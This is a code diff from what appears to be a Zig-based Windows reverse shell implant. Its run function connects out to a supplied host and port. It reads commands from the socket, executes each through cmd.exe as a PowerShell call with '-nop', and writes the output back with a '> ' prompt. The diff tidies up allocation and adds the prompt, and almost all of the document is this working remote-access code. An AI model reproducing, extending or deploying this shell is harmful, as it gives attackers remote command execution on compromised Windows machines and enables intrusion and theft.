@@ -25,30 +25,23 @@ const MAX_BUFFER_SIZE: usize = 2048;
 const MAX_INPUT_BYTES: usize = 1024;
 const MAX_OUTPUT_BYTES: usize = 4096;
 
-fn readCommand(socket: std.net.Stream) !LPWSTR {
-    const allocator = std.heap.page_allocator;
-
+fn readCommand(allocator: std.mem.Allocator, socket: std.net.Stream) ![]u16 {
     var buf: [MAX_INPUT_BYTES]u8 = undefined;
     const buf_size = try socket.read(buf[0..]);
     if (buf_size == 0) return error.ServerClosed;
 
-    const cmd_tmp = buf[0..buf_size]; // Remove last character ('\n')
-    const cmd = try std.fmt.allocPrint(allocator, "/C powershell -nop {s}", .{cmd_tmp});
-    defer allocator.free(cmd);
+    const cmd_tmp = try std.fmt.allocPrint(allocator, "/C powershell -nop {s}", .{buf[0..buf_size]});
+    defer allocator.free(cmd_tmp);
 
     // Convert u8 to u16
-    var cmd_buf_w: [MAX_BUFFER_SIZE:0]u16 = undefined;
-    const cmd_buf_w_length = try std.unicode.utf8ToUtf16Le(&cmd_buf_w, try allocator.dupe(u8, cmd));
-    cmd_buf_w[cmd_buf_w_length] = 0; // Add null-terminated character.
-    const cmd_w = @as(LPWSTR, @ptrCast(try allocator.dupe(u16, &cmd_buf_w)));
-    return cmd_w;
+    var cmd_tmp_w: [MAX_BUFFER_SIZE:0]u16 = undefined;
+    const cmd_tmp_w_length = try std.unicode.utf8ToUtf16Le(&cmd_tmp_w, try allocator.dupe(u8, cmd_tmp));
+    cmd_tmp_w[cmd_tmp_w_length] = 0; // Add null-terminated character.
+
+    return allocator.dupe(u16, &cmd_tmp_w);
 }
 
-fn readOutput(h_read_pipe: HANDLE) ![]u8 {
-    const allocator = std.heap.page_allocator;
-    var output = std.ArrayList(u8).init(allocator);
-    defer output.deinit();
-
+fn readOutput(output: *std.ArrayList(u8), h_read_pipe: HANDLE) !void {
     var output_buf: [MAX_OUTPUT_BYTES]u8 = undefined;
     while (true) {
         const bytes_read = try ReadFile(h_read_pipe, &output_buf, 0);
@@ -56,12 +49,12 @@ fn readOutput(h_read_pipe: HANDLE) ![]u8 {
 
         try output.appendSlice(output_buf[0..bytes_read]);
     }
-    return output.toOwnedSlice();
 }
 
 pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
     var socket = try std.net.tcpConnectToHost(allocator, addr, port);
     defer socket.close();
+    _ = try socket.writeAll("> ");
 
     const app_name = W("C:\\Windows\\System32\\cmd.exe");
 
@@ -79,17 +72,22 @@ pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
     defer output_stdout.deinit();
     var output_stderr = std.ArrayList(u8).init(allocator);
     defer output_stderr.deinit();
+    var output = std.ArrayList(u8).init(allocator);
+    defer output.deinit();
 
     while (true) {
         output_stdout.clearRetainingCapacity();
         output_stderr.clearRetainingCapacity();
+        output.clearRetainingCapacity();
 
-        const cmd_w = readCommand(socket) catch |err| {
+        const cmd_u16 = readCommand(allocator, socket) catch |err| {
             switch (err) {
                 error.ServerClosed => break,
                 else => continue,
             }
         };
+        // Convert u16 to LPWSTR
+        const cmd_w = @as(LPWSTR, @ptrCast(cmd_u16));
 
         try CreatePipe(&h_read_pipe, &h_write_pipe, &sa);
         try SetHandleInformation(h_read_pipe, HANDLE_FLAG_INHERIT, 0);
@@ -129,8 +127,8 @@ pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
             &si,
             &pi,
         ) catch |err| {
-            const alloc = std.heap.page_allocator;
-            const error_message = try std.fmt.allocPrint(alloc, "error: {}\n", .{err});
+            const error_message = try std.fmt.allocPrint(allocator, "error: {}\n> ", .{err});
+            defer allocator.free(error_message);
             _ = try socket.write(error_message);
             continue;
         };
@@ -140,14 +138,13 @@ pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
         defer CloseHandle(pi.hThread);
         defer CloseHandle(pi.hProcess);
 
-        const output = try readOutput(h_read_pipe);
+        try readOutput(&output, h_read_pipe);
 
         // Send the output to the server.
-        if (output.len > 0) {
-            _ = try socket.writeAll(output);
-        } else {
-            _ = try socket.writeAll("");
+        if (output.items.len > 0) {
+            _ = try socket.writeAll(output.items);
         }
+        _ = try socket.writeAll("> ");
 
         CloseHandle(h_read_pipe);
 
